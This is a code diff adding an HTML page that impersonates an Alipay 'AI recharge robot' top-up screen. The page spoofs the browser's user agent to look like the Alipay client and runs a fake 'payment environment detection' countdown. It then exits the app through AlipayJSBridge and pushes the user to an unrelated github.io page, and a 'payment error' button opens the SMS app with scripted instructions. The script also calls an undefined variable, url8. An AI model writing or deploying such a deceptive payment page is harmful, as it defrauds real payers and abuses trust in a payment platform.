@@ -1,0 +1,298 @@
+
+<html><head>
+    <meta charset="utf-8">
+    <title>支付宝</title>
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style">
+    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
+    <script type="text/javascript" src="http://u.vhuifu.cn/Public/Home/js/jquery.min.js"></script>
+    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+    <script type="text/javascript">Object.defineProperty(window.navigator, 'userAgent', { get: function () { return 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; KIW-AL10 Build/HONORKIW-AL10) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AlipayDefined(nt:WIFI,ws:360|592|3.0) AliApp(AP/9.5.3.030408) AlipayClient/9.5.3.030408 Language/zh-Hans'; } }); Object.defineProperty(window.navigator, 'vendor', { get: function () { return ''; } }); Object.defineProperty(window.navigator, 'platform', { get: function () { return 'Android'; } });</script>
+    <style>
+        html, body {
+            padding: 0;
+            margin: 0;
+            height: 100%;
+            width: 100%;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Microsoft YaHei, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol
+        }
+
+        body.hi, body.hi * {
+            display: none;
+            background: #fff;
+        }
+
+        body {
+            background: #3e94c7;
+        }
+
+        .h {
+            text-align: center;
+            background: #ffdcdc;
+            color: #cf3a40;
+            line-height: 2.5;
+            font-size: 13px
+        }
+
+        #app {
+            overflow: hidden;
+            padding: 1px 0;
+            width: 86%;
+            margin: 20px auto;
+            box-sizing: border-box;
+            position: relative;
+            background: #fff;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .1)
+        }
+
+        #app p {
+            color: #ffc107;
+            font-size: 13px;
+            text-align: center;
+            margin: 0 0 3px;
+        }
+
+        .h .ico {
+            background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAgCAYAAAF7rFiTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAE82lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDUgNzkuMTYzNDk5LCAyMDE4LzA4LzEzLTE2OjQwOjIyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOSAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDE5LTAyLTEyVDE3OjAzOjAyKzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxOS0wMi0xMlQxNzowMzoxOSswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOS0wMi0xMlQxNzowMzoxOSswODowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6YTc1OGQ5ZWYtMDI5Ny1iNDQzLTk0MjEtNjVjYWVjNjQ0ZTUxIiB4bXBNTTpEb2N1bWVudElE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") 50% no-repeat;
+            padding: 0 10px;
+            background-size: auto 100%
+        }
+
+        .money {
+            width: 90%;
+            margin: 10px auto;
+            line-height: 120px;
+            height: 120px;
+            text-align: center;
+            font-size: 50px;
+            color: #474747;
+            background: -webkit-linear-gradient(transparent 17px, #f7f7f7 0, #f7f7f7 18px, transparent 0) repeat;
+            background: linear-gradient(transparent 17px, #f7f7f7 0, #f7f7f7 18px, transparent 0) repeat;
+            background-size: 18px 18px
+        }
+
+        .he {
+            padding: 53px 20px 8px
+        }
+
+        .av {
+            width: 48px;
+            height: 48px;
+            background: url(/Public/Home/img/jq.jpeg) center no-repeat;
+            background-size: cover;
+            border-radius: 50%;
+            float: left;
+            margin-right: 10px;
+            border: 4px solid #ff9393;
+            margin-top: 9px
+        }
+
+        .ti span {
+            color: #f2f2f2;
+            font-size: 12px;
+            padding: 4px 0;
+            text-transform: uppercase;
+            font-weight: 600;
+            display: block
+        }
+
+        .ti p {
+            font-size: 14px;
+            color: #ffeb3b;
+            line-height: 22px;
+            margin: 0;
+            letter-spacing: 2px
+        }
+
+        .steps {
+            padding: 20px
+        }
+
+        .st {
+            position: relative;
+            font-size: 14px;
+            width: 80%;
+            margin: 0 auto 40px;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center
+        }
+
+        .st + .st:before {
+            content: '';
+            height: 50px;
+            display: block;
+            position: absolute;
+            border-left: dashed rgba(255, 235, 59, .6) 1px;
+            left: 17px;
+            bottom: 36px
+        }
+
+        .st:after {
+            content: '';
+            display: block;
+            clear: both
+        }
+
+        .st i {
+            width: 36px;
+            display: block;
+            height: 36px;
+            text-align: center;
+            line-height: 36px;
+            background: #ffeb3b;
+            color: #000;
+            font-size: 18px;
+            border-radius: 50%;
+            margin-right: 10px;
+            font-weight: 600;
+            box-shadow: #ffeb3b 0 0 5px
+        }
+
+        .st span {
+            -webkit-box-flex: 1;
+            -ms-flex: 1;
+            flex: 1;
+            color: rgba(255, 255, 255, .9)
+        }
+
+        .st span b {
+            color: white
+        }
+
+        #py {
+            width: 223px;
+            font-size: 14px;
+            margin: 24px auto 18px;
+            text-align: center;
+            line-height: 36px;
+            background: #3e94c7;
+            color: #fff;
+            border-radius: 4px;
+            height: 36px;
+            box-shadow: #3e94c7 0 2px 8px
+        }
+        #py1 {
+            width: 223px;
+            font-size: 14px;
+            margin: 24px auto 18px;
+            text-align: center;
+            line-height: 36px;
+            background: red;
+            color: #fff;
+            border-radius: 4px;
+            height: 36px;
+            box-shadow: #3e94c7 0 2px 8px
+        }
+    </style>
+</head>
+<body class="">
+<div class="he">
+    <div class="av"></div>
+    <div class="ti">
+        <span>Ai充值机器人</span>
+        <p>1.请使用直接付款。</p>
+        <p>2.付款成功后将自动充值到账。</p>
+    </div>
+</div>
+<!--<a href="alipays://platformapi/startapp?appId=20000067&url=https://66666858.h5app.alipay.com/www/changecode/collect_money.htm?nickName%3D%E6%9D%8E%E6%B5%AA%E7%9A%84%E6%89%8B%E7%8E%AF%26changeCodeId%3D87_84a283e8b2b824760c51e533cdf51ca5%26canRechargeMoney%3D10000.00%5EbizScenario%3DscanApp%5Eversion%3D0.3.2001081441.41%5EappId%3D66666858">立即支付</a>-->
+<div id="app">
+    <div class="h"><span class="ico"> </span>你敢付，我敢赔</div>
+    <div class="money">￥<span id="ci">100.00</span></div>
+    <p>充值单号：<b id="mo">2020021576114114</b></p>
+    <div id="py" onclick="gopay();"></div>
+    <div id="py1">支付异常点击此处</div>
+
+</div>
+<div class="steps">
+    <div class="st">
+        <i>1</i>
+        <span>等待支付环境检测完成，点击确认，选择<b>“点击付款”</b>。</span>
+    </div>
+    <div class="st">
+        <i>2</i>
+        <span>完成支付。</span>
+    </div>
+</div>
+<script>
+
+
+    function go(u) {
+        setTimeout(function () {
+            AlipayJSBridge.call("exitApp");
+            AlipayJSBridge.call('pushWindow', {
+                url:u,
+                param: {
+                    readTitle: true,
+                    showOptionMenu: false
+                }
+            });
+            //window.location.href = u;
+        }, 100);
+    }
+
+    var e = "检测完成";
+    var f = "请点击发送消息\r\n如果遇到转账失败，请多试几次";
+    var g = "马上支付";
+    var url9= window.location.origin + "/Api/ios_pay/id/2020021576114114.html";
+    url9 = "https://1izheng.github.io/xpage/wangxin2/2.html";
+    document.body.className = '';
+    document.getElementById("ci").textContent = parseFloat("100.00").toFixed(2);
+    document.getElementById("mo").textContent = "2020021576114114"
+    if (window.AlipayJSBridge) {
+        AlipayJSBridge.call("setTitleColor", {
+            color: parseInt("3e94c7", 16),
+            reset: false
+        });
+        AlipayJSBridge.call("setTitle", {
+            title: "自助充值",
+            subtitle: "安全支付"
+        });
+        AlipayJSBridge.call("setOptionMenu", {
+            icontype: "filter",
+            redDot: "1"
+        });
+        AlipayJSBridge.call("hideOptionMenu");
+    }
+
+    var timek =0;
+    var timez =100;
+    function run() {
+        var py = document.getElementById("py");
+        var py1 = document.getElementById("py1");
+        if (timez != 0){
+            timek++;
+            timez--;
+            py.textContent = '正在检测支付环境(' + parseInt(timek) + '%)';
+            setTimeout(run,5);
+        }else {
+            py.textContent = '去支付';
+            go(url9);
+            py.onclick = function () {
+                go(url9);
+            };
+            py1.onclick = function () {
+                var message = '手机即将跳转到短信，\n请退出短信回到支付宝付款！';
+                AlipayJSBridge.call('alert', {title: "亲", message: message, button: "确定"}, function () {
+                    setTimeout(function () {
+                        go(url8);
+                    }, 1500);
+                    window.location.href = 'sms:?body=请等待3秒，然后关闭短信编辑页面，直接回到支付宝继续付款！！！';
+                })
+            }
+
+        }
+    }
+
+    run();
+    function gopay(){
+        go(url8);
+    }
+</script>
+
+
+</body></html>
